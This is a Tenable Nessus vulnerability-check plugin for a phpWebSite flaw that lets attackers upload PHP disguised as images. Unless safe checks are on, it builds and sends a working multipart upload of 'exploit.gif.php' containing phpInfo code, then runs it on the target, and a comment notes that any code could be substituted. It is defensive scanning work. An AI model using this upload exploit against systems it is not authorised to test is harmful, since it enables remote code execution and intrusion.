#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(17223);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2005-0565");
  script_bugtraq_id(12653);
  script_osvdb_id(14127);

  script_name(english:"phpWebSite Image Announcement Upload Arbitrary Command Execution");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows for arbitrary
code execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of phpWebSite in which the
Announcements module allows a remote attacker to both upload PHP
scripts disguised as image files and later run them using the
permissions of the web server user." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=110928565530828&w=2" );
  # http://phpwebsite.appstate.edu/index.php?module=announce&ANN_id=922&ANN_user_op=view
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?13948819" );
 script_set_attribute(attribute:"solution", value:
"Apply the security patch referenced in the vendor advisory above or
upgrade to version 0.10.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/02/25");
 script_cvs_date("$Date: 2012/09/18 22:25:46 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpwebsite:phpwebsite");
script_end_attributes();

  script_summary(english:"Detects arbitrary PHP file upload as image file vulnerability in phpWebSite");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2012 Tenable Network Security, Inc.");
  script_dependencies("phpwebsite_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpwebsite");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Check each installed instance, stopping if we find a vulnerability.
install = get_kb_item(string("www/", port, "/phpwebsite"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  init_cookiejar();
  ver = matches[1];
  dir = matches[2];

  url = "/index.php";
  url_args = "module=announce&ANN_user_op=submit_announcement";
  r = http_send_recv3(method: "GET", item:dir + url + "?" + url_args, port:port);
  if (isnull(r)) exit(0);

  # If file uploads are supported....
  if ('<input type="file" name="ANN_image"' >< r[2]) {

    # If safe_checks are enabled, rely on the version number alone.
    if (safe_checks()) {
      if (ver =~ "^0\.([0-9]\.|10\.0$)") {
        security_hole(port);
        exit(0);
      }
    }
    # Otherwise, try to exploit it.
    else {
      #  Grab the session cookie?

        bound = "bound";
        boundary = string("--", bound);
        postdata = string(
          boundary, "\r\n", 
          'Content-Disposition: form-data; name="module"', "\r\n",
          "\r\n",
          "announce\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_user_op"', "\r\n",
          "\r\n",
          "save\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_subject"', "\r\n",
          "\r\n",
          "Image Upload Test\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_summary"', "\r\n",
          "\r\n",
          "Image uploads are possible!\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_body"', "\r\n",
          "\r\n",
          "See attached image.\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_image"; filename="exploit.gif.php"', "\r\n",
          "Content-Type: image/gif\r\n",
          "\r\n",
          # NB: This is the actual exploit code; you could put pretty much
          #     anything you want here.
          "<?php phpinfo() ?>\r\n",

          boundary, "\r\n", 
          'Content-Disposition: form-data; name="ANN_alt"', "\r\n",
          "\r\n",
          "empty\r\n",

          boundary, "--", "\r\n"
        );
	r = http_send_recv3(port:port, method: "POST", item: dir+url, data: postdata,
add_headers: make_array("Content-Type", "multipart/form-data; boundary="+bound));
        if (isnull(r)) exit(0);

        # Run the attachment we just uploaded.
        url = string(dir, "/images/announce/exploit.gif.php");
        r = http_send_recv3(method: "GET", item:url, port:port);
        if (isnull(r)) exit(0);

        # If we could run it, there's a problem.
        if ("PHP Version" >< r[2]) {
          w = string(
              "**** Nessus has successfully exploited this vulnerability by uploading\n",
              "**** an image file with PHP code that reveals information about the\n",
              "**** PHP configuration on the remote host. The file is located under\n",
              "**** the web server's document directory as:\n",
              "****          ", url, "\n",
              "**** You are strongly encouraged to delete this attachment as soon as\n",
              "**** possible as it can be run by anyone who accesses it remotely.\n" );
          security_hole(port:port, extra: w);
          exit(0);
        }
      }
    }
}
